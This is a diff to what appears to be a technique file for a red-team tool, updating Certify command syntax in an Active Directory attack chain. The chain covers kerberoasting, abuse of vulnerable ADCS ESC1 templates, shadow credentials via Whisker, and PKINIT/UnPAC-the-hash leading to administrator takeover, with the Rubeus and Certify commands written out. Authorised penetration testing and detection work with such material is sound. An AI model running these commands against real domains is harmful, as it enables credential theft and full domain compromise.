@@ -21,11 +21,11 @@ detection_signal: |
   S4U chain, shadow credential write. No additional detection beyond the component techniques.
 usage_examples:
   - description: Find kerberoastable accounts → check for ADCS ESC1 enrollment rights
-    args: "Rubeus.exe kerberoast /ldaponly → Certify.exe find /vulnerable"
+    args: "Rubeus.exe kerberoast /ldaponly → Certify.exe enum-templates --filter-vulnerable"
   - description: If account has GenericWrite → shadow credentials + PKINIT path
     args: "Whisker.exe add /target:<kerberoastable-svc-acct> → Rubeus.exe asktgt /certificate:..."
   - description: If ADCS ESC1 exists and account can enroll → request cert + authenticate
-    args: "Certify.exe request /ca:CA /template:VulnTemplate /altname:admin@domain"
+    args: "Certify.exe request --ca SERVER\\CA-NAME --template VulnTemplate --upn admin@domain"
 opsec_notes: |
   Kerberoasting and AS-REP roasting are traditionally followed by offline hash cracking.
   Sage does NOT crack hashes. However, both techniques identify service accounts that are
@@ -70,11 +70,11 @@ Step 1: Check ACLs on the account
     → No cracking needed; full account takeover
 
 Step 2: Check ADCS enrollment rights
-  → Certify find /vulnerable
+  → Certify enum-templates --filter-vulnerable
   → Does svc-backup (or a group it belongs to) have enrollment rights on an ESC1 template?
 
   If ESC1 enrollment available and svc-backup has access:
-    → Certify request /ca:CA /template:ESC1Template /altname:administrator
+    → Certify request --ca SERVER\CA-NAME --template ESC1Template --upn administrator@domain
     → Rubeus PKINIT with the cert → UnPAC hash → PTH
     → No cracking needed
 
